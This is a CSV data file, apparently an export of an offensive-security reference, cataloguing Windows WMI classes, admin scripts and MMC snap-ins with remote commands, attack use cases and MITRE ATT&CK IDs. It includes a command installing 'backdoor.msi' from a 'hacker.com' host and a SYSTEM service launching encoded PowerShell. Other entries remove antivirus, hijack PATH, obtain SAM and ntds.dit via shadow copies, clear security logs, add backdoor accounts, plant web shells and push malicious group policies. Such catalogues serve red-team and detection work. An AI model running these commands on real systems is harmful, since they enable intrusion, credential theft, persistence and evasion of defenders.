"Name","Description","Updated","Toolsets","Commands","Commands_Command","Commands_Description","Commands_Usecases","Commands_Function","Commands_Comments","Commands_MitreAttack","Resources","Detections","Contributors","Contributors_Name","Contributors_Handle","Detections_Port","is_legit"
"Win32_SystemDriver","Represents the system driver for a base service","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","None","None","None","Processes","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''Namespace: `ROOT\Cimv2`'']","None","None","None","","Arris Huijgen","bitsadmin","","false"
"Win32_ShadowCopy","Storage extent that represents a duplicate copy of the original volume at a previous time","2023-07-01","[''Builtin''-|-''CIMSession'']","","Get-CimInstance -ClassName Win32_ShadowCopy -CimSession $s -Filter ""ID=`""$($r.ShadowID)`""""","[''Create new shadow copy''-|-''Show details of a volume shadow copy'']","[''None''-|-''Get shadow copy details for use with [Copy-Item](../../Cmdlets/Copy-Item) to obtain `SAM`/`SYSTEM`/`SECURITY`/`ntds.dit` files'']","[''Data''-|-''Data'']","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''Namespace: `ROOT\Cimv2`''-|-''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''Namespace: `ROOT\Cimv2`'']","[''None''-|-''None'']","None","None","","Arris Huijgen","bitsadmin","","false"
"Win32_Service","Represents a service on a computer system running Windows","2023-07-01","[''Builtin''-|-''CIMSession'']","","[''$tssvc = Get-CimInstance -Filter 'Name=""TermService""' -ClassName Win32_Service -CimSession $s $tssvc $tssvc | Invoke-CimMethod -MethodName StartService ''-|-''Get-CimInstance -ClassName Win32_Service -CimSession $s''-|-''Get-CimInstance -Filter 'Name=""TermService""' -ClassName Win32_Service -CimSession $s''-|-''Invoke-WmiMethod -Class Win32_Service -Name Create -ArgumentList $false,""Print Spooler (x64)"",([byte]1),$null,$null,""spoolsv64"",""C:\Windows\System32\cmd.exe /c powershell -e bHM="",$null,([byte]16),""Manual"",""NT AUTHORITY\SYSTEM"",""""'']","[''Start service''-|-''List services''-|-''Obtain a specific service instance''-|-''Create new service'']","[''None''-|-''Reconnaissance on installed services''-|-''Start or stop a service''-|-''None'']","[''Execute''-|-''Processes''-|-''Processes''-|-''Execute'']","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''Namespace: `ROOT\Cimv2`''-|-''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)'']","[''T1569.002''-|-''None''-|-''None''-|-''TA0002'']","None","None","","Arris Huijgen","bitsadmin","","false"
"Win32_QuickFixEngineering","Represents a small system-wide update, commonly referred to as a quick-fix engineering (QFE) update, applied to the current operating system","2023-07-01","[''Builtin''-|-''CIMSession'']","","Get-CimInstance Win32_QuickFixEngineering -CimSession $s","List of installed KBs","List OS info and installed security updates and feed them to WES-NG to identify vulnerabilities","Recon","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''See also [systeminfo.exe](../../Binaries/systeminfo)''-|-''Namespace: `ROOT\Cimv2`'']","TA0043","None","None","","Arris Huijgen","bitsadmin","","false"
"Win32_Product","Represent products as they are installed by MSI","2023-08-25","[''Builtin''-|-''CIMSession'']","","[''Get-CimInstance -ClassName Win32_Product -CimSession $s | Select-Object Caption,Vendor,Version,InstallLocation''-|-''Invoke-CimMethod -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation=""https://hacker.com/backdoor.msi""; Options=""""; AllUsers=$true} -CimSession $s''-|-''Get-CimInstance Win32_Product -Filter 'Caption=""Antivirus Software caption""' -CimSession $s | Remove-CimInstance'']","[''List installed software''-|-''Install software''-|-''Uninstall software'']","[''Perform reconnaissance on installed security software''-|-''Launch and install malicious .msi package''-|-''Remove security software'']","[''Manage''-|-''Execute''-|-''Manage'']","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''Namespace: `ROOT\Cimv2`''-|-''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''Namespace: `ROOT\Cimv2`''-|-''.msi file needs to be available on the target host''-|-''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''Namespace: `ROOT\Cimv2`'']","[''T1218.007''-|-''T1218.007''-|-''T1218.007''-|-''T1562.001'']","https://blog.bitsadmin.com/living-off-the-foreign-land-windows-as-offensive-platform-part-3#execute-command-lines","None","","Arris Huijgen","bitsadmin","","false"
"Win32_Process","Represents a process on an operating system","2023-07-01","[''Builtin''-|-''CIMSession'']","","Get-CimInstance -ClassName Win32_Process -CimSession $s | select ProcessId,Name,CommandLine | ft * -AutoSize -Wrap","[''Launch executable''-|-''List running processes'']","[''Launch implant''-|-''Launch implant'']","[''Execute''-|-''Processes'']","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''Namespace: `ROOT\Cimv2`''-|-''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''Namespace: `ROOT\Cimv2`'']","[''TA0002''-|-''None'']","None","None","","Arris Huijgen","bitsadmin","","false"
"Win32_OperatingSystem","Represents a Windows-based operating system installed on a computer","2023-07-01","[''Builtin''-|-''CIMSession'']","","Get-CimInstance Win32_OperatingSystem -CimSession $s | fl *","Information about OS","Reconnaissance of target operating system","Recon","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''See also [systeminfo.exe](../../Binaries/systeminfo)''-|-''Namespace: `ROOT\Cimv2`''-|-''Alternative: `CIM_OperatingSystem`'']","TA0043","None","None","","Arris Huijgen","bitsadmin","","false"
"Win32_NTLogEvent","Displays the Windows Event Log","2023-07-01","[''Builtin''-|-''CIMSession'']","","Get-CimInstance -ClassName Win32_NTLogEvent -Filter ""LogFile = 'Security' AND EventCode = '4624'"" -CimSession $s","List logons on a system","Understand which accounts are used on a system","Logs","Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","None","None","None","","Arris Huijgen","bitsadmin","","false"
"Win32_Environment","Represents an environment or system environment setting on a Windows computer system","2023-07-01","[''Builtin''-|-''CIMSession'']","","New-CimInstance -ClassName Win32_Environment -Property @{Name=""PATH"";VariableValue=""C:\hackertools; C:\Windows\System32;C:\Windows"";UserName=""<SYSTEM>""} -CimSession $s","Set environment variable","Change PATH environment variable for search order hijacking","Manage","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''For the VariableValue, first obtain the current `PATH` using `Get-CimInstance` and then prefix it with the malicious path''-|-''Namespace: `ROOT\Cimv2`'']","None","None","None","","Arris Huijgen","bitsadmin","","false"
"Win32_DfsNode","Represents a root or a link of a domain based or a standalone distributed file system (DFS)","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","None","None","None","Data","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''Namespace: `ROOT\Cimv2`'']","None","None","None","","Arris Huijgen","bitsadmin","","false"
"StdRegProv","The StdRegProv class contains methods that manipulate system registry keys and values","2023-07-01","[''Builtin''-|-''CIMSession'']","","[''Invoke-CimMethod -ClassName StdRegProv -MethodName GetDWORDValue -Arguments @{hDefKey=[uint32]2147483650; sSubKeyName=""Software\Policies\Microsoft\Windows NT\Terminal Services""; sValueName=""Shadow""} -CimSession $s''-|-''Invoke-CimMethod -ClassName StdRegProv -MethodName SetDWORDValue -Arguments @{hDefKey=[uint32]2147483650; sSubKeyName=""Software\Policies\Microsoft\Windows NT\Terminal Services""; sValueName=""Shadow""; uValue=[uint32]2} -CimSession $s''-|-''Invoke-CimMethod -ClassName StdRegProv -MethodName DeleteValue -Arguments @{hDefKey=[uint32]2147483650; sSubKeyName=""Software\Policies\Microsoft\Windows NT\Terminal Services""; sValueName=""Shadow""} -CimSession $s'']","[''Query value''-|-''Set value''-|-''Delete value'']","[''None''-|-''None''-|-''None'']","[''Registry''-|-''Registry''-|-''Registry'']","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''Namespace: `ROOT\Cimv2`''-|-''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''Namespace: `ROOT\Cimv2`''-|-''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''Namespace: `ROOT\Cimv2`'']","[''None''-|-''None''-|-''None'']","None","None","","Arris Huijgen","bitsadmin","","false"
"MSFT_NetFirewallRule","Represents a Windows firewall rule","2023-07-01","[''Builtin''-|-''CIMSession'']","","$fwrule = Get-CimInstance -Namespace ROOT\StandardCimv2 -ClassName MSFT_NetFirewallRule -Filter 'DisplayName=""Remote Desktop - Shadow (TCP-In)""' -CimSession $s $fwrule $fwrule | Invoke-CimMethod -MethodName Enable","Enable firewall rule","None","Manage","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''Namespace: `ROOT\StandardCimv2`'']","None","None","None","","Arris Huijgen","bitsadmin","","false"
"MSFT_DNSClientCache","Represents a record in a DNS client cache","2023-07-01","[''Builtin''-|-''CIMSession'']","","Get-CimInstance -Namespace ROOT\StandardCimv2 -ClassName MSFT_DNSClientCache -CimSession $s","List cached DNS entries","Reconnaissance on the network/Internet activities on the computer","Network","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''See also [Get-DnsClientCache](../../Cmdlets/Get-DnsClientCache)''-|-''Namespace: `ROOT\StandardCimv2`'']","None","None","None","","Arris Huijgen","bitsadmin","","false"
"CIM_LogicalFile","Represents a named collection of data located in a file system on a storage extent","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","None","None","None","Data","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''Namespace: `ROOT\Cimv2`'']","None","None","None","","Arris Huijgen","bitsadmin","","false"
"CIM_Directory","Type of file that logically groups data files 'contained' in it, and provides path information for the grouped files","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","None","None","None","Data","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''Namespace: `ROOT\Cimv2`'']","None","None","None","","Arris Huijgen","bitsadmin","","false"
"CIM_DataFile","Type of logical file that is a named collection of data or executable code","2024-12-13","[''Builtin''-|-''CIMSession'']","","Get-CimInstance -Query ""Select * from CIM_DataFile Where ((Drive = 'C:') AND (FileName = 'ntuser') AND (Extension = 'dat'))"" -CimSession $s","[''Locate files''-|-''Copy file'']","[''Perform reconaissance on filesystem''-|-''Copy file to Public share to copy it from there'']","[''Data''-|-''Data'']","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''Pretty slow''-|-''Namespace: `ROOT\Cimv2`''-|-''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)'']","[''None''-|-''None'']","None","None","","Arris Huijgen","bitsadmin","","false"
"winrm.cmd","Windows Remote Management","2023-07-01","Builtin","","[''winrm.vbs get wmicimv2/Win32_Process?Handle=3456 -r:W10.ad.bitsadmin.com''-|-''winrm.vbs invoke Create wmicimv2/Win32_Process -r:W10.ad.bitsadmin.com @{CommandLine=""notepad.exe"";CurrentDirectory=""C:\""}'']","[''Check process details''-|-''Lauch process'']","[''Reconnaissance on running processes''-|-''After having copied an implant over SMB, launch it'']","[''Processes''-|-''Execute'']","[''None''-|-''None'']","[''T1057''-|-''T1021.006''-|-''T1047''-|-''T1021.006'']","None","None","","Arris Huijgen","bitsadmin","","false"
"slmgr.vbs","Obtain volume activation information","2023-07-01","Builtin","","[''cscript.exe slmgr.vbs W10.ad.bitsadmin.com /dlv''-|-''cscript.exe slmgr.vbs W10.ad.bitsadmin.com /upk'']","[''Show Windows activation information''-|-''Uninstall Windows product key'']","[''None''-|-''Cripple Windows activation to maybe have an admin user connect to the system to fix it'']","[''Misc''-|-''Misc'']","[''None''-|-''None'']","[''None''-|-''None'']","None","None","","Arris Huijgen","bitsadmin","","false"
"pubprn.vbs","Publishes a printer to the Active Directory Domain Services","2023-07-01","[''Builtin''-|-''TODO'']","","cscript pubprn.vbs","None","None","Manage","Script is located in the `%SystemRoot%\System32\printing_Admin_Scripts\<language>` directory","None","None","None","","Arris Huijgen","bitsadmin","","false"
"ospp.vbs","Configure volume licensed versions of Office products","2023-07-01","Extra","","cscript.exe ospp.vbs W10.ad.bitsadmin.com /dstatusall","Show Office activation information","None","Misc","None","None","None","None","","Arris Huijgen","bitsadmin","","false"
"wsus.msc","Update Services","2023-07-01","[''GUI''-|-''RSAT'']","","wsus.msc","Update Services","Deploy malicious updates","Manage","[''Right click -> Connect to Server''-|-''Port 5830/TCP is used in case of HTTP, port 5831/TCP is used in case of TLS'']","None","None","","","Arris Huijgen","bitsadmin","[''5830/TCP''-|-''5831/TCP'']","false"
"wsecedit.dll","Security Configuration and Analysis","2023-07-01","[''Builtin''-|-''GUI'']","","[''mmc.exe''-|-''mmc.exe'']","[''Security Configuration and Analysis''-|-''Security Templates'']","[''None''-|-''None'']","[''Manage''-|-''Manage'']","[''Open via MMC's Add/Remove Snap-In -> Security Configuration and Analysis -> OK''-|-''Right click the node -> Open Database -> Enter whatever name -> Open -> Open the .inf file''-|-''Open via MMC's Add/Remove Snap-In -> Security Configuration and Analysis -> OK''-|-''Used to create .inf files from [secpol.msc](../secpol) settings'']","[''None''-|-''None'']","None","None","","Arris Huijgen","bitsadmin","","false"
"winsmgmt.msc","WINS","2023-07-01","[''GUI''-|-''RSAT'']","","winsmgmt.msc","WINS","None","Manage","[''Right click -> Add Server -> WINS server: `DC1.ad.bitsadmin.com` -> OK -> The specified server name could not be validated''-|-''To add this server to the console, type the IP address: `10.0.10.10` -> OK'']","None","None","","","Arris Huijgen","bitsadmin","[''445/TCP''-|-''135/TCP'']","false"
"wbadmin.msc","Windows Server Backup","2023-07-01","[''GUI''-|-''Server'']","","mmc.exe","Windows Server Backup","Purge backups?","Manage","mmc.exe -> File -> Add/Remove Snap-In -> Windows Server Backup -> Add -> Another computer: `DC1.ad.bitsadmin.com` -> Finish -> OK","T1485","None","","","Arris Huijgen","bitsadmin","135/TCP","false"
"virtmgmt.msc","Hyper-V Manager","2023-07-01","[''GUI''-|-''RSAT'']","","virtmgmt.msc","Hyper-V Manager","[''Connect to the console of a server which might be directly accessible because of an `AutoAdminLogon` registry setting, or because an admin has logged onto the console''-|-''Install an unmonitored offensive VM to use to pivot through the network'']","Manage","[''Right click root node -> Connect to Server -> Remote server -> `HYPERV1.ad.bitsadmin.com`''-|-''Uses ports 5985/TCP (WinRM, for management and non-enhanced session) and 2197/TCP (VMRDP for Enhanced Session) - Once a VM screen is opened (little display appears to be rendered over WinRM)''-|-''If a screen is opened without using the enhanced session functionality, it continues to use WinRM'']","None","None","","","Arris Huijgen","bitsadmin","[''5985/TCP''-|-''2197/TCP'']","false"
"tsgateway.msc","RD Gateway Manager","2023-07-01","[''GUI''-|-''RSAT'']","","tsgateway.msc","RD Gateway Manager","[''Disable auditing''-|-''Specify who can use the RD gateway and to which devices it can be used'']","Manage","Right click on RD Gateway Manager -> Connect to RD Gateway Server -> Remote server: `DC1.ad.bitsadmin.com`","None","None","","","Arris Huijgen","bitsadmin","135/TCP","false"
"tsconfig.msc","Remote Desktop Session Host Configuration","2023-07-01","[''GUI''-|-''Server'']","","tsconfig.msc","Remote Desktop Session Host Configuration","None","Manage","None","None","None","None","","Arris Huijgen","bitsadmin","","false"
"tsadmin.msc","Remote Desktop Services Manager","2023-07-01","[''GUI''-|-''Server'']","","tsadmin.msc","Remote Desktop Services Manager","None","Manage","Removed in Server 2012+. Copy `tsadmin.msc` and related files from Windows Server 2008 R2","None","https://woshub.com/how-to-run-tsadmin-msc-and-tsconfig-msc-snap-ins-on-windows-server-2012-rds/","None","","Arris Huijgen","bitsadmin","","false"
"tpm.msc","Trusted Platform Module (TPM) Management","2023-07-01","[''Builtin''-|-''GUI'']","","mmc.exe","Trusted Platform Module (TPM) Management","Wipe the TPM to impact availability; only the Bitlocker Recovery Key will then help to recover the data","Manage","Add or Remove Snap-ins -> TPM Management -> Add -> Another computer: `W11.ad.bitsadmin.com` -> OK","None","None","","","Arris Huijgen","bitsadmin","135/TCP","false"
"taskschd.msc","Task Scheduler","2023-11-04","[''Builtin''-|-''GUI'']","","taskschd.msc","Task Scheduler","Create backdoor for persistence: Advantage, an EDR will have a hard time to connect the persistence to the implant/backdoor that is running the SOCKS server","Execute","[''Right click -> Connect to Another Computer''-|-''Alternatively, use [compmgmt.msc](../compmgmt)'']","T1053.005","None","","","Arris Huijgen","bitsadmin","135/TCP","false"
"tapimgmt.msc","Telephony","2023-07-01","[''GUI''-|-''Server'']","","tapimgmt.msc","Telephony","None","Manage","Right click -> Add computer -> Another computer: `DC1.ad.bitsadmin.com` -> OK","None","None","","","Arris Huijgen","bitsadmin","445/TCP","false"
"services.msc","Services","2023-07-01","[''Builtin''-|-''GUI'']","","services.msc /computer:DC1.ad.bitsadmin.com","Services","[''Identify security solutions running on the endpoint''-|-''Stop/disable security services'']","Manage","Quite slow to collect information on all services through SOCKS, performs 4 requests (Open/Query/something/Close) for every service. Better use [sc.exe](../../Binaries/sc) in case the name of the service is known","T1569.002","None","","","Arris Huijgen","bitsadmin","135/TCP","false"
"secpol.msc","Local Security Policy","2023-07-01","[''Builtin''-|-''GUI'']","","gpedit.msc","Local Security Policy","None","Manage","[''Remotely just use [gpedit.msc](../gpedit)''-|-''Direct link to gpedit.msc -> Computer Configuration -> Windows Settings -> Security Settings'']","None","None","","","Arris Huijgen","bitsadmin","445/TCP","false"
"schmmgmt.dll","Active Directory Schema","2023-07-01","[''GUI''-|-''RSAT'']","","mmc.exe","Active Directory Schema","None","Domain","Open via MMC's Add/Remove Snap-in, then right click the root node -> Change Active Directory Domain Controller","None","None","","","Arris Huijgen","bitsadmin","[''389/UDP''-|-''445/TCP'']","false"
"rsop.msc","Resultant Set of Policy","2023-07-01","[''Builtin''-|-''GUI'']","","rsop.msc","Resultant Set of Policy","Perform reconnaissance on applied (security) policies on remote system","Domain","Right click RSoP -> Change Query -> Another computer: `DC1.ad.bitsadmin.com` -> Next -> Next -> Next -> Finish","None","None","None","","Arris Huijgen","bitsadmin","","false"
"rrasmgmt.msc","Routing and Remote Access","2023-07-01","[''GUI''-|-''RSAT'']","","rrasmgmt.msc /ComputerName DC1.ad.bitsadmin.com","Routing and Remote Access","Port mirror all traffic to us?","Manage","Alternative: Right click Routing and Remote Access -> Add Server -> The following computer: `DC1.ad.bitsadmin.com` -> OK","None","None","","","Arris Huijgen","bitsadmin","[''135/TCP''-|-''445/TCP'']","false"
"remoteprograms.msc","RemoteApp Manager","2023-07-01","[''GUI''-|-''Server'']","","remoteprograms.msc","RemoteApp Manager","None","Manage","Seems to be deprecated, nowadays management of remote apps seems to be done through [ServerManager.exe](../../Binaries/ServerManager)","None","None","None","","Arris Huijgen","bitsadmin","","false"
"printmanagement.msc","Print Management","2023-07-01","[''Builtin''-|-''GUI'']","","printmanagement.msc","Print Management","Install a malicious printer driver?","Manage","None","None","None","","","Arris Huijgen","bitsadmin","[''445/TCP''-|-''135/TCP'']","false"
"pkiview.msc","Enterprise PKI","2023-07-01","[''GUI''-|-''RSAT'']","","pkiview.msc","Enterprise PKI","None","Manage","Does not seem possible to use this snap-in remotely","None","None","None","","Arris Huijgen","bitsadmin","","false"
"perfmon.msc","Performance Monitor","2023-07-01","[''Builtin''-|-''GUI'']","","perfmon.msc","Performance Monitor","None","Manage","[''Action -> Connect to another computer -> Another computer: `DC1.ad.bitsadmin.com` -> OK''-|-''Requires ""Remote Registry"" service to be running on the remote host'']","None","None","","","Arris Huijgen","bitsadmin","135/TCP","false"
"ocsp.msc","Online Responder Management","2023-07-01","[''GUI''-|-''RSAT'']","","ocsp.msc /Computer:DC1.ad.bitsadmin.com","Online Responder Management","None","Manage","Alternative via GUI: Right click Online Responder -> Retarget Responder -> Another computer: `DC1.ad.bitsadmin.com` -> OK","None","None","","","Arris Huijgen","bitsadmin","135/TCP","false"
"nps.msc","Network Policy Server","2023-07-01","[''GUI''-|-''Server'']","","nps.msc /computer:DC1.ad.bitsadmin.com","Network Policy Server","None","Manage","Alternative: mmc.exe -> Add or Remove Snap-ins -> Network Policy Server -> Add -> Another computer -> `DC1.ad.bitsadmin.com` -> OK","None","None","","","Arris Huijgen","bitsadmin","445/TCP","false"
"nfsmgmt.msc","Services for NFS","2023-07-01","[''GUI''-|-''RSAT'']","","nfsmgmt.msc","Services for NFS","None","Manage","Right click on root node -> Connect to another computer -> Another computer: `DC1.ad.bitsadmin.com` -> OK","None","None","","","Arris Huijgen","bitsadmin","5985/TCP","false"
"lusrmgr.msc","Local Users and Groups","2023-11-04","[''Builtin''-|-''GUI'']","","lusrmgr.msc /computer=W10.ad.bitsadmin.com","Local Users and Groups","[''Add a backdoor user''-|-''Change password of existing user''-|-''Enable and disable accounts''-|-''Add users to, and remove users from groups''-|-''Configure backdoor logon script'']","Manage","[''Alternative is to use [compmgmt.msc](../compmgmt)''-|-''Through this snap-in it does not seem possible to add a user to a local group on the remote machine. Through [compmgmt.msc](../compmgmt) this _does_ work well though'']","[''T1531''-|-''T1136.001''-|-''T1078.003'']","None","","","Arris Huijgen","bitsadmin","445/TCP","false"
"lsdiag.msc","Remote Desktop Licensing Diagnoser","2023-07-01","[''GUI''-|-''RSAT'']","","lsdiag.msc","Remote Desktop Licensing Diagnoser","None","Manage","Right click root node -> Connect to Remote Desktop Session Host Server -> Another computer: `DC1.ad.bitsadmin.com` -> OK","None","None","","","Arris Huijgen","bitsadmin","[''445/TCP''-|-''135/TCP'']","false"
"ipsmsnap.dll","IP Security Monitor","2023-07-01","[''Builtin''-|-''GUI'']","","mmc.exe","IP Security Monitor","None","Manage","[''Open via MMC's Add/Remove Snap-ins, then right click the root node -> Add Computer -> The following computer: `DC1.ad.bitsadmin.com` -> OK''-|-''IPSec service needs to be running on the remote host'']","None","None","","","Arris Huijgen","bitsadmin","445/TCP","false"
"ipsecsnp.dll","IP Security Policy Management","2023-07-01","[''Builtin''-|-''GUI'']","","[''mmc.exe''-|-''mmc.exe'']","[''IP Security Policy Management for a computer''-|-''IP Security Policy Management for domain'']","[''Weaken IPSec requirements''-|-''Weaken IPSec requirements'']","[''Manage''-|-''Manage'']","[''Open via MMC's Add/Remove Snap-In -> IP Security Policy Management -> Another Active Directory domain: `DC1.ad.bitsadmin.com` -> Finish -> OK''-|-''Open via MMC's Add/Remove Snap-In -> IP Security Policy Management -> Another Active Directory domain: `ad.bitsadmin.com` -> Finish -> OK'']","[''None''-|-''None'']","None","","","Arris Huijgen","bitsadmin","[''389/UDP''-|-''445/TCP'']","false"
"iis6.msc","Internet Information Services (IIS) 6.0 Manager","2023-07-01","GUI","","iis6.msc","Internet Information Services (IIS) 6.0 Manager","None","Manage","Right click -> Connect -> Computer name: `DC1.ad.bitsadmin.com` -> OK","None","None","","","Arris Huijgen","bitsadmin","135/TCP","false"
"iis.msc","Internet Information Services (IIS) Manager","2023-07-01","GUI","","iis.msc","Internet Information Services (IIS) Manager","[''Create virtual directory with web shell (drop shell over SMB or maybe create virtual directory on share)''-|-''Add FTP site to be able to browse the filesystem''-|-''Weaken authentication''-|-''Add MIME Types to be able to download certain file extensions'']","Manage","[''Right click Start Page -> Connect to a Server -> Server name: `SP2019.ad.bitsadmin.com` -> Next -> Enter User name/password -> Next -> Connection Name: `SP2019` -> Finish''-|-''Requires to install and enabled Remote IIS Management service''-|-''Does not seem possible to perform authentication transparently through Kerberos''-|-''Can also be launched via `inetmgr.exe`'']","None","https://woshub.com/remote-iis-management-in-windows-server-2012/","","","Arris Huijgen","bitsadmin","8172/TCP","false"
"gptedit.msc","Group Policy Starter GPO Editor","2023-07-01","[''GUI''-|-''RSAT'']","","gptedit.msc /s /gtmpobject:""\\DC1.ad.bitsadmin.com\sysvol\ad.bitsadmin.com\StarterGPOs\{DE3EB8C2-A808-4509-9D89-D383F950AEDB}\""","Group Policy Starter GPO Editor","None","Domain","Edit Group Policy Starter GPO directly based on the path","None","None","","","Arris Huijgen","bitsadmin","445/TCP","false"
"gpme.msc","Group Policy Management Editor","2023-07-01","[''GUI''-|-''RSAT'']","","gpme.msc /gpobject:""LDAP://CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=ad,DC=bitsadmin,DC=com""","Group Policy Management Editor","Execute immediate scheduled tasks on machines to launch implant","Domain","[''Only possible from OffensiveDC''-|-''Commandline launches editor for the GUID of the default domain policy; can be changed to other GUIDs to edit different policies'']","T1053.005","None","","","Arris Huijgen","bitsadmin","445/TCP","false"
"gpmc.msc","Group Policy Management","2023-07-01","[''GUI''-|-''RSAT'']","","gpmc.msc /domain:ad.bitsadmin.com","Group Policy Management","[''Create and link a malicious group policy to systems''-|-''Force the update of group policy on all machines in an OU'']","Domain","For remote domains, this needs to be executed from OffensiveDC. Also use the `/domain` parameter in the commandline. In View -> Options -> General, uncheck the ""Enable trust detection"" checkbox. Next, right click the root node -> Add forest","[''T1037.003''-|-''T1484.001'']","None","","","Arris Huijgen","bitsadmin","[''389/UDP''-|-''445/TCP'']","false"
"gpedit.msc","Local Group Policy Editor","2024-12-13","[''Builtin''-|-''GUI'']","","[''gpedit.msc /gpcomputer: DC1.ad.bitsadmin.com''-|-''gpedit.msc /gpobject:""LDAP://CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=ad,DC=bitsadmin,DC=com""'']","[''Local Group Policy Editor for a computer''-|-''Local Group Policy Editor for a computer'']","[''Add evil startup script''-|-''Weaken security as a backdoor''-|-''Open ports in the firewall''-|-''Execute immediate scheduled tasks on machines to launch implant'']","[''Manage''-|-''Domain'']","[''Quotes around the hostname or in case of no quotes a space before the hostname seem to be required''-|-''Through SMB edits files in `\\DC1.ad.bitsadmin.com\ADMIN$\GroupPolicy` (= `%SystemRoot%\System32\GroupPolicy`)''-|-''Example edits Default Domain Policy, change GUID for editing other policies''-|-''Through SMB edits files in `\\ad.bitsadmin.com\SYSVOL\{GUID}` (= `%SystemRoot%\Sysvol\sysvol\ad.bitsadmin.com` by default) on the DC'']","[''None''-|-''T1037.003''-|-''T1484.001'']","None","","","Arris Huijgen","bitsadmin","445/TCP","false"
"fxsadmin.msc","Fax Service Manager","2023-07-01","[''GUI''-|-''Server'']","","fxsadmin.msc","Fax Service Manager","None","Manage","`mmc.exe` -> File -> Add/Remove Snap-In -> Fax Service Manager -> Add -> Another computer: `DC1.ad.bitsadmin.com` -> Finish -> OK","None","None","","","Arris Huijgen","bitsadmin","445/TCP","false"
"fsrm.msc","File Server Resource Manager","2023-07-01","[''GUI''-|-''RSAT'']","","fsrm.msc","File Server Resource Manager","None","Manage","Right click File Server Resource Manager -> Connect to Another Computer -> Another computer: `DC1.ad.bitsadmin.com`","None","None","","","Arris Huijgen","bitsadmin","[''445/TCP''-|-''135/TCP'']","false"
"fsmgmt.msc","Shared Folders","2023-07-01","[''Builtin''-|-''GUI'']","","fsmgmt.msc /computer:W10.ad.bitsadmin.com","Shared Folders","[''View which users are connected to the share from which computername''-|-''View which files are opened by which users''-|-''Add (hidden - dollar share) shared folder'']","Manage","Alternatively, use [compmgmt.msc](../compmgmt)","[''T1135''-|-''T1021.002'']","None","","","Arris Huijgen","bitsadmin","445/TCP","false"
"eventvwr.msc","Event Viewer","2023-07-01","[''Builtin''-|-''GUI'']","","[''eventvwr.exe DC1.ad.bitsadmin.com''-|-''eventvwr.msc /computer:DC1.ad.bitsadmin.com'']","[''Event Viewer''-|-''Event Viewer'']","[''Clear the Security event log''-|-''Disable certain logs (Right click -> Disable Log)''-|-''Identify source IPs from which certain users have logged in to chase after their workstations''-|-''Configure the Security log to not overwrite events so it will just stop logging''-|-''Clear the Security event log''-|-''Disable certain logs (Right click -> Disable Log)''-|-''Identify source IPs from which certain users have logged in to chase after their workstations''-|-''Configure the Security log to not overwrite events so it will just stop logging'']","[''Logs''-|-''Logs'']","[''Alternatively, use [compmgmt.msc](../compmgmt) or launch the snap-in, right click the root node -> Connect to Another Computer''-|-''Alternatively, use [compmgmt.msc](../compmgmt) or launch the snap-in, right click the root node -> Connect to Another Computer'']","[''T1070.001''-|-''T1562.002''-|-''T1070.001''-|-''T1562.002'']","None","","","Arris Huijgen","bitsadmin","135/TCP","false"
"dssite.msc","Active Directory Sites and Services","2023-07-01","[''GUI''-|-''RSAT'']","","[''dssite.msc /domain=AD.BITSADMIN.COM''-|-''dssite.msc /server=DC1.ad.bitsadmin.com'']","[''Manage domain''-|-''Manage specific server'']","[''Collect information about sites and IP subnets''-|-''Collect information about sites and IP subnets'']","[''Domain''-|-''Domain'']","[''Does not work from the OffensiveDC, use `/server` parameter instead''-|-''None'']","[''None''-|-''None'']","None","","","Arris Huijgen","bitsadmin","389/TCP","false"
"dsa.msc","Active Directory Users and Computers","2023-07-01","[''GUI''-|-''RSAT'']","","dsa.msc /server=DC1.ad.bitsadmin.com","Active Directory Users and Computers","[''Perform reconnaissance on users, groups and computers in the domain''-|-''Add backdoor user or computer account''-|-''Modify group membership''-|-''View user's BitLocker recovery passwords'']","Domain","None","None","None","","","Arris Huijgen","bitsadmin","[''389/TCP''-|-''445/TCP'']","false"
